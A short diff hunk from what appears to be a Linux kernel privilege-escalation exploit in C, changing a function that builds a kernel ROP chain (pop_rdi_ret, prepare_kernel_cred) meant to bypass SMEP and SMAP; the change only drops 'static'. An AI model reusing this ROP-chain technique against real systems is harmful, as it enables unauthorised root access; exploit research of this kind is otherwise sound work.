@@ -47,7 +47,7 @@ void escalate_privilege(void) {
 }
 
 // +smep,+smap
-static void krop(uint64_t *ptr) {
+void krop(uint64_t *ptr) {
     *ptr++ = pop_rdi_ret;
     *ptr++ = 0;
     *ptr++ = addr_prepare_kernel_cred;
